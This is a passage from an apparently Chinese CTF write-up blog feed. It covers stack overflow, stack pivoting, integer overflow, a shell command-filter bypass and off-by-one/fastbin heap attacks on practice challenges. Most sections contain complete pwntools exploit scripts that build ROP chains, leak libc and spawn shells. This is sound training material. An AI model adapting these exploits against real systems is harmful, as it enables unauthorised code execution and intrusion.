class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x00400703</span></span><br><span class="line">bank_addr = <span class="number">0x00601080</span></span><br><span class="line">leave_retn = <span class="number">0x0400699</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span> + p64(bank_addr) + p64(leave_retn)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;me what you want\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(ret)*<span class="number">20</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;now!&#x27;</span>,payload2)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr ---&gt; &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x06f690</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x68</span>) + p64(onegadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;me what you want\n&#x27;</span>,payload3)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;now!&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-s-4"><a href="#ciscn-s-4" class="headerlink" title="ciscn_s_4"></a>ciscn_s_4</h2><p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210720150810391.png" alt="image-20210720150810391"></p>
<p><img src="/article/Stack%20Overflow/image-20210720150946310.png" alt="image-20210720150946310"></p>
<h3 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29437</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line">leave = <span class="number">0x80485FD</span></span><br><span class="line">system_plt = <span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">buf = ebp - <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br><span class="line"></span><br><span class="line">payload = p32(system_plt) + p32(<span class="number">0</span>) + p32(buf+<span class="number">12</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buf-<span class="number">4</span>) + p32(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><p><img src="/article/Stack%20Overflow/image-20211024153951978.png" alt="image-20211024153951978"></p>
<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29093</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">23946</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400ad3</span></span><br><span class="line">main_addr = <span class="number">0x0000000004008F6</span></span><br><span class="line">leave_retn_addr = <span class="number">0x000000000400A18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x00000000004009E4&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;saved at 0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment"># print(hex(stack_addr))</span></span><br><span class="line">log.success(<span class="string">&#x27;stack_addr_1: &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr) + p64(leave_retn_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># print(hex(puts_addr))</span></span><br><span class="line">log.success(<span class="string">&#x27;puts_addr: &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#########################</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"><span class="comment">#########################</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;saved at 0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;stack_addr_2: &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(one_gadget)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr) + p64(leave_retn_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
<p>先看ida</p>
<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
<p>程序中给出了/bin/sh的地址</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


<p>Int8, 等于Byte, 占1个字节.</p>
<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
<p>   　这样, 看起来比short,int,long更加直观些!</p>
<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="BJDCTF-2nd-test"><a href="#BJDCTF-2nd-test" class="headerlink" title="[BJDCTF 2nd]test"></a>[BJDCTF 2nd]test</h2><p>参考：<a href="https://blog.csdn.net/qin9800/article/details/105058058">https://blog.csdn.net/qin9800/article/details/105058058</a></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191550.png" alt="20201223191550"></p>
<p>用 <code>ssh -p 28572 ctf@node3.buuoj.cn</code> 链接</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191650.png" alt="20201223191650"></p>
<p>发现三个文件，flag文件无法cat</p>
<p>看一下c文件</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223191806.png" alt="20201223191806"></p>
<p>发现是过滤命令</p>
<p>可以通过</p>
<p><code>ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;</code></p>
<p>查看还有什么命令是可以用的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-v 或 --revert-match : 显示不包含匹配文本的所有行。</span><br><span class="line">-E 或 --extended-regexp : 将样式为延伸的正则表达式来使用。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223192201.png" alt="20201223192201"></p>
<p>可以用 od 和 x86_64</p>
<p>Linux od命令用于输出文件内容。</p>
<p>od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p>
<p>x86_64</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223193256.png" alt="20201223193256"></p>
<h1 id="一些其他"><a href="#一些其他" class="headerlink" title="一些其他"></a>一些其他</h1><h2 id="一些-Stack-漏洞点"><a href="#一些-Stack-漏洞点" class="headerlink" title="一些 Stack 漏洞点"></a>一些 Stack 漏洞点</h2><ul>
<li>signed int类型，4字节，最大输入为2147483647，超出则为负数，若下面是unsigned int类型的数据作为read的n，则能越过前面类似if ( (signed int)nbytes &gt; 10 )的检查</li>
<li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li>
<li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li>
<li>strlen，计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的</li>
<li>stcpy，在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code>，能造成 NULL byte off-by-one</li>
</ul>
<h2 id="一些汇编"><a href="#一些汇编" class="headerlink" title="一些汇编"></a>一些汇编</h2><p><img src="/article/Stack%20Overflow/image-20211106141433020.png" alt="image-20211106141433020"></p>
<ul>
<li><p>RIP(PC)</p>
<p>存放下一条指令的偏移地址</p>
</li>
<li><p>RSP</p>
<p>存放当前栈帧的栈顶偏移地址</p>
<p>低地址的一端</p>
</li>
<li><p>RBP</p>
<p>存放当前栈帧的栈底偏移地址</p>
<p>高地址的一端</p>
<p>与返回地址（return address）相邻</p>
</li>
<li><p>RAX</p>
<p>存放函数返回值</p>
</li>
<li><p>RCX</p>
<p>存放累加器的结果</p>
</li>
<li><p>RDI</p>
<p>存放第一个参数</p>
</li>
<li><p>RSI</p>
<p>存放第二个参数</p>
</li>
</ul>
<p>64位程序中函数的前6个参数使用寄存器进行存储：rdi、rsi、rdx、rcx、r8、r9</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Stack Overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Heap_Exploitation</title>
    <url>/article/Heap_Exploitation/</url>
    <content><![CDATA[<h1 id="Heap-Exploitation"><a href="#Heap-Exploitation" class="headerlink" title="Heap_Exploitation"></a>Heap_Exploitation</h1><span id="more"></span>







<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>ida</p>
<p>main</p>
<p><img src="/article/Heap_Exploitation/image-20210530180818212.png" alt="image-20210530180818212"></p>
<p>add</p>
<p><img src="/article/Heap_Exploitation/image-20210530180843629.png" alt="image-20210530180843629"></p>
<p>edit</p>
<p><img src="/article/Heap_Exploitation/image-20210530180910931.png" alt="image-20210530180910931"></p>
<p><img src="/article/Heap_Exploitation/image-20210530180924105.png" alt="image-20210530180924105"></p>
<p>当size与content长度相差10的时候，有off by one漏洞</p>
<p>free</p>
<p><img src="/article/Heap_Exploitation/image-20210530181018439.png" alt="image-20210530181018439"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li>利用 off-by-one 和 chunk overlapping 来 leak 出 libc 地址</li>
<li>利用 off-by-one 和 fastbin attack 在 malloc hook上方申请fake fastbin</li>
<li>利用 realloc调整 rsp的值达成 getshell的条件（这题不能直接onegadget</li>
</ul>
<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>1、申请4个 chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1 change size</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2 overlapping chunk</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3 top chunk</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210530193522667.png" alt="image-20210530193522667"></p>
<p>2、利用 off-by-one修改 chunk1的 size位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210530194139167.png" alt="image-20210530194139167"></p>
<p>chunk2 的作用就是让 chunk1 + chunk2 的长度等于我们修改的 size大小</p>
<p>3、free unsortedbin</p>
<p><img src="/article/Heap_Exploitation/image-20210530195228812.png" alt="image-20210530195228812"></p>
<p>4、</p>
<p><img src="/article/Heap_Exploitation/image-20210530195253925.png" alt="image-20210530195253925"></p>
<p>把chunk1申请回来，此时 main_arena + 88 的地址就在 chunk2中了</p>
<p>5、fastbin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 5 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 6 change size</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 7 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 8 </span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 9 top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)<span class="comment">#change 7 size</span></span><br></pre></td></tr></table></figure>

<p>用和上面一样的方法修改size位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">6</span>)<span class="comment"># 6 and 7</span></span><br><span class="line">free(<span class="number">7</span>)<span class="comment"># free 8</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210530201524535.png" alt="image-20210530201524535"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)<span class="comment">#6</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Heap_Exploitation/image-20210530200403737.png" alt="image-20210530200403737"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">6</span>,<span class="number">0x80</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fake_fast) + p64(<span class="number">0</span>)*<span class="number">11</span>)</span><br></pre></td></tr></table></figure>

<p>6、修改fd</p>
<p><img src="/article/Heap_Exploitation/image-20210530201903053.png" alt="image-20210530201903053"></p>
<p>7、利用 realloc_hook调整rsp，然后getshell</p>
<p><img src="/article/Heap_Exploitation/image-20210530202940484.png" alt="image-20210530202940484"></p>
<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28530</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1 change size</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3 top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">fake_fast = malloc_hook - <span class="number">0x23</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 4 malloc back</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main_arena)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 5 overflow chunk</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 6 change size</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 7 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment"># 8 </span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment"># 9 top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x18</span>+<span class="number">10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x91&#x27;</span>)<span class="comment">#change 7 size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)<span class="comment"># 6 and 7</span></span><br><span class="line">free(<span class="number">7</span>)<span class="comment"># free 8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x80</span>+<span class="number">10</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(fake_fast) + p64(<span class="number">0</span>)*<span class="number">11</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#10 fake fastbin</span></span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>,<span class="number">0x4526a</span>]</span><br><span class="line">one = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">3</span> + p64(<span class="number">0</span>) + p64(one) + p64(realloc+<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main_arena)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下：</p>
<ul>
<li>add：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li>
<li>edit：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li>
<li>free：根据指定索引，释放已经分配的内存块</li>
<li>show：这个功能原本并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出。但是其中有 strlen 函数，我们可以修改 strlen_got 为 puts_plt 的地址，打到 leak 的目的</li>
</ul>
<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p>
<ul>
